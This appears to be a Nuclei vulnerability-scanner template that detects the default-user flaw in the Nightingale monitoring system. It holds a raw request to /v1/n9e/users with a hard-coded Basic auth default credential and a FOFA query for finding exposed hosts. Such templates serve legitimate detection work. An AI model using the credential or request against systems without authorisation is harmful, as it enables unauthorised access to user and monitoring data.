id: nightingale-default-login

info:
  name: Nightingale - Default Login
  author: qwtd
  severity: high
  description: 夜莺开源监控系统存在默认用户漏洞，/v1/n9e/接口401鉴权存在默认用户。
  reference:
    - https://wiki.wy876.cn/#/./%E5%A4%9C%E8%8E%BA%E5%BC%80%E6%BA%90%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/%E5%A4%9C%E8%8E%BA%E5%BC%80%E6%BA%90%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7%E6%BC%8F%E6%B4%9E
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="icon-yijigaojing"
  tags: Nightingale

http:
  - raw:
      - |
        GET /v1/n9e/users HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Authorization: Basic dXNlcjAwMTpjY2MyNmRhN2I5YWJhNTMzY2JiMjYzYTM2YzA3ZGNjNQ==

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'maintainer":'
          - 'create_at":'
          - 'update_at":'
        condition: and

      - type: status
        status:
          - 200